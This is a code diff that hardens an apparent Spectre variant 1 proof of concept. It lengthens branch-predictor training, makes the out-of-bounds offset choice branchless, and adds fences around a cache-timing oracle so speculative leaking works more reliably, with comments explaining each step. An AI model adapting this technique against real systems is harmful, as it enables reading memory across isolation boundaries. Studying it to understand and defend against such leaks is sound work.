@@ -148,15 +148,26 @@ static char leak_byte(const char *data, size_t offset) {
     // we want to leak via out-of-bounds speculative access.
     int safe_offset = run % strlen(data);
 
-    for (size_t i = 0; i < 10; ++i) {
+    // Loop length must be high enough to beat branch predictors.
+    // The current length 2048 was established empirically. With significantly
+    // shorter loop lengths some branch predictors are able to observe the
+    // pattern and avoid branch mispredictions.
+    for (size_t i = 0; i < 2048; ++i) {
       // Remove from cache so that we block on loading it from memory,
       // triggering speculative execution.
-      _mm_clflush(&*size_in_heap);
+      _mm_clflush(size_in_heap);
+      _mm_mfence();
 
-      // Train the branch predictor: perform in-bounds accesses 9 times,
+      // Train the branch predictor: perform in-bounds accesses 2047 times,
       // and then use the out-of-bounds offset we _actually_ care about on the
-      // tenth time.
-      size_t local_offset = ((i + 1) % 10) ? safe_offset : offset;
+      // 2048th time.
+      // The local_offset value computation is a branchless equivalent of:
+      // size_t local_offset = ((i + 1) % 2048) ? safe_offset : offset;
+      // We need to avoid branching even for unoptimized compilation (-O0).
+      // Optimized compilations (-O1, concretely -fif-conversion) would remove
+      // the branching automatically.
+      size_t local_offset = offset + (
+          safe_offset - offset) * (bool)((i + 1) % 2048);
 
       if (local_offset < *size_in_heap) {
         // This branch was trained to always be taken during speculative
@@ -183,13 +194,16 @@ static char leak_byte(const char *data, size_t offset) {
       // On the CPUs this has been tested on, placing values 4096 bytes apart
       // is sufficient to defeat prefetching.
       void *timing_entry = &isolated_oracle[i];
-      unsigned int junk;
-      // RDTSCP instruction waits for execution of all preceding instructions.
-      int64_t start = __rdtscp(&junk);
+      _mm_mfence();
+      _mm_lfence();
+      int64_t start = __rdtsc();
       _mm_lfence();
       force_read(timing_entry);
-      sorted_latencies[i] = latencies[i] = __rdtscp(&junk) - start;
+      _mm_mfence(); // Necessary for x86 MSVC.
       _mm_lfence();
+      sorted_latencies[i] = latencies[i] = __rdtsc() - start;
+      _mm_mfence(); // Necessary for x86 MSVC.
+      _mm_lfence(); // Necessary for x86 MSVC.
     }
 
     std::sort(sorted_latencies.begin(), sorted_latencies.end());
